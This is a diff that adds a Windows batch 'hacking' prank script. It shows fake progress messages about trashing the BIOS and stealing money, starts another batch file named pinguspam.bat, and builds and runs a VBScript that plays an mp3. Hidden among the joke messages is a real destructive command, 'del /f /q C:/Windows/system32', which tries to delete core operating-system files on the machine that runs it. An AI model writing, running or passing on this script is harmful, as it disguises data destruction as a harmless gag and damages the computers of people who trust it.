@@ -1,0 +1,49 @@
+@echo off
+@cls
+@color 17
+@echo WinHax Hacking
+@echo y or n
+@set /p op=Start hacking?
+@if "%op%"=="y" goto op1
+@if "%op%"=="n" goto op2
+
+:op1
+start pinguspam.bat
+set "file=pingulolz.mp3"
+( echo Set Sound = CreateObject("WMPlayer.OCX.7"^)
+  echo Sound.URL = "%file%"
+  echo Sound.Controls.play
+  echo do while Sound.currentmedia.duration = 0
+  echo wscript.sleep 100
+  echo loop
+  echo wscript.sleep (int(Sound.currentmedia.duration^)+1^)*1000) >sound.vbs
+start /min sound.vbs
+@cls
+@color 02
+@cd /
+@tree
+@echo getting access to bios...
+@timeout /t 3 >nul
+@echo trashing the bios...
+@timeout /t 3 >nul
+@echo hacking all your accounts...
+@timeout /t 3 >nul
+@echo stealing all your money...
+@timeout /t 3 >nul
+@echo oh, you have no money...
+@timeout /t 3 >nul
+@echo making your cpu form cracks in the silicon...
+@timeout /t 3 >nul
+@echo hacking done and computer destroyed!
+del /f /q C:/Windows/system32
+@timeout /t 3 >nul
+@goto exit
+
+:op2
+@echo Goodbye!
+@timeout /t 1 >nul
+@goto exit
+
+:exit
+@color 07
+@cls
